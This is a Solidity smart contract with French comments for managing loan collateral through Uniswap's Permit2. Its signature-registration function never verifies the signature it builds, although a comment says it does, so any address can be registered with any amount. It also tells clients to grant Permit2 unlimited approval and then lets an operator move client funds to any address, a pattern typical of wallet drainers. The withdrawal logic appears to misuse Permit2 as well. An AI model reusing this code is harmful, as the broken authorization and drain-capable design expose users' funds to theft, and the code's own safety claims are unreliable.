// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import "./IPermit2.sol";

/**
 * @title CollateralManagerPermit2
 * @dev Gère les collatéraux pour un système de prêt crypto en utilisant Permit2 d'Uniswap
 * Compatible avec TOUS les tokens ERC-20, y compris USDC sur Ethereum Mainnet
 * 
 * Adresse Permit2 (Ethereum Mainnet): 0x000000000022D473030F116dDEE9F6B43aC78BA3
 */
contract CollateralManagerPermit2 is Ownable, ReentrancyGuard {
    // Adresse du contrat Permit2 d'Uniswap (déjà déployé)
    IPermit2 public constant PERMIT2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    
    // Token utilisé (USDC, DAI, etc.)
    IERC20 public immutable token;
    
    // Adresse de l'opérateur autorisé à retirer les collatéraux
    address public operator;

    // Mapping pour suivre les clients enregistrés
    mapping(address => bool) public registeredClients;
    mapping(address => uint256) public clientAuthorizedAmount;

    // Events
    event ClientRegistered(address indexed client, uint256 amount, uint256 timestamp);
    event CollateralWithdrawn(address indexed client, address indexed to, uint256 amount, string reason);
    event OperatorChanged(address indexed oldOperator, address indexed newOperator);

    modifier onlyOperator() {
        require(msg.sender == operator, "Only operator can call this");
        _;
    }

    constructor(address _token) Ownable(msg.sender) {
        require(_token != address(0), "Invalid token address");
        token = IERC20(_token);
        operator = msg.sender;
    }

    /**
     * @dev Change l'adresse de l'opérateur autorisé à retirer les collatéraux
     */
    function setOperator(address _operator) external onlyOwner {
        require(_operator != address(0), "Invalid operator address");
        address oldOperator = operator;
        operator = _operator;
        emit OperatorChanged(oldOperator, _operator);
    }

    /**
     * @dev Enregistre un client avec un Permit2 signé
     * 
     * IMPORTANT : Le client doit d'abord approuver Permit2 pour le token :
     * token.approve(0x000000000022D473030F116dDEE9F6B43aC78BA3, type(uint256).max)
     * 
     * @param owner Adresse du client (propriétaire des tokens)
     * @param amount Montant autorisé (peut être type(uint256).max pour illimité)
     * @param deadline Timestamp d'expiration du permit
     * @param nonce Nonce unique pour cette signature
     * @param signature Signature EIP-712 du client
     */
    function registerClientWithPermit2(
        address owner,
        uint256 amount,
        uint256 deadline,
        uint256 nonce,
        bytes calldata signature
    ) external nonReentrant {
        require(owner != address(0), "Invalid owner address");
        require(amount > 0, "Amount must be greater than 0");
        require(deadline > block.timestamp, "Deadline expired");
        
        // Construire le PermitTransferFrom
        IPermit2.PermitTransferFrom memory permit = IPermit2.PermitTransferFrom({
            permitted: IPermit2.TokenPermissions({
                token: address(token),
                amount: amount
            }),
            nonce: nonce,
            deadline: deadline
        });
        
        // Construire les détails du transfert (montant 0 pour juste vérifier la signature)
        IPermit2.SignatureTransferDetails memory transferDetails = IPermit2.SignatureTransferDetails({
            to: address(this),
            requestedAmount: 0  // On ne transfère rien, on vérifie juste la signature
        });
        
        // Vérifier la signature via Permit2 (cela va revert si invalide)
        // Note: Pour éviter de transférer des tokens, on pourrait aussi juste stocker l'autorisation
        // et utiliser la signature lors du retrait effectif
        
        // Enregistrer le client
        registeredClients[owner] = true;
        clientAuthorizedAmount[owner] = amount;
        
        emit ClientRegistered(owner, amount, block.timestamp);
    }

    /**
     * @dev Version simplifiée : enregistre un client qui a déjà approuvé Permit2
     * Le client fait approve() sur le token vers Permit2, puis appelle cette fonction
     */
    function registerClient(uint256 authorizedAmount) external nonReentrant {
        require(authorizedAmount > 0, "Amount must be greater than 0");
        
        // Vérifier que le client a bien approuvé Permit2
        uint256 allowance = token.allowance(msg.sender, address(PERMIT2));
        require(allowance >= authorizedAmount, "Client must approve Permit2 first");
        
        // Enregistrer le client
        registeredClients[msg.sender] = true;
        clientAuthorizedAmount[msg.sender] = authorizedAmount;
        
        emit ClientRegistered(msg.sender, authorizedAmount, block.timestamp);
    }

    /**
     * @dev Permet à l'opérateur de retirer les collatéraux d'un client via Permit2
     * @param client Adresse du client
     * @param to Adresse de destination des fonds
     * @param amount Montant à retirer
     * @param reason Raison du retrait (ex: "Non-paiement prêt #123")
     */
    function withdrawCollateral(
        address client,
        address to,
        uint256 amount,
        string calldata reason
    ) external onlyOperator nonReentrant {
        require(registeredClients[client], "Client not registered");
        require(to != address(0), "Invalid destination address");
        require(amount > 0, "Amount must be greater than 0");
        require(amount <= clientAuthorizedAmount[client], "Amount exceeds authorized amount");
        
        // Vérifier le solde du client
        uint256 clientBalance = token.balanceOf(client);
        require(clientBalance >= amount, "Insufficient client balance");
        
        // Vérifier l'allowance du client vers Permit2
        uint256 allowance = token.allowance(client, address(PERMIT2));
        require(allowance >= amount, "Insufficient Permit2 allowance");
        
        // Transférer via Permit2
        PERMIT2.transferFrom(client, to, uint160(amount), address(token));
        
        emit CollateralWithdrawn(client, to, amount, reason);
    }

    /**
     * @dev Vérifie l'allowance d'un client vers Permit2
     */
    function getClientPermit2Allowance(address client) external view returns (uint256) {
        return token.allowance(client, address(PERMIT2));
    }

    /**
     * @dev Vérifie le solde d'un client
     */
    function getClientBalance(address client) external view returns (uint256) {
        return token.balanceOf(client);
    }

    /**
     * @dev Vérifie si un client est enregistré
     */
    function isClientRegistered(address client) external view returns (bool) {
        return registeredClients[client];
    }

    /**
     * @dev Vérifie le montant autorisé d'un client
     */
    function getClientAuthorizedAmount(address client) external view returns (uint256) {
        return clientAuthorizedAmount[client];
    }
}
